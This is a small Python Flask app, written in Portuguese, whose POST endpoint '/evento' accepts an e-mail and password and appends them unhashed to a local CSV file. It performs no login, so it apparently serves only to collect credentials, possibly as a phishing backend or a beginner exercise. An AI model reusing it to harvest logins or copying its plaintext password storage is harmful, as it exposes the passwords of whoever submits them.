
import csv
from pathlib import Path
from datetime import datetime

from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

ARQUIVO_CSV = Path(__file__).resolve().parent / "dados.csv"


@app.route("/")
def inicio():
    return render_template("index.html")


@app.route("/evento", methods=["POST"])
def registrar_dados():
    dados = request.get_json(silent=True) or {}

    email = str(dados.get("email", "")).strip()
    senha_texto = str(dados.get("senha", "")).strip()

    if not email or "@" not in email:
        return jsonify({"erro": "Informe um e-mail válido."}), 400

    try:
        senha = str(senha_texto)
    except Exception:
        return jsonify({"erro": "Informe uma senha válida."}), 400
    with ARQUIVO_CSV.open(
        "a",
        newline="",
        encoding="utf-8-sig"
    ) as arquivo:
        campos = ["data_hora", "email", "senha"]
        escritor = csv.DictWriter(arquivo, fieldnames=campos)

        escritor.writerow({
            "data_hora": datetime.now().astimezone().isoformat(
                timespec="seconds"
            ),
            "email": email,
            "senha": senha
        })

    return jsonify({"sucesso": True}), 200


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
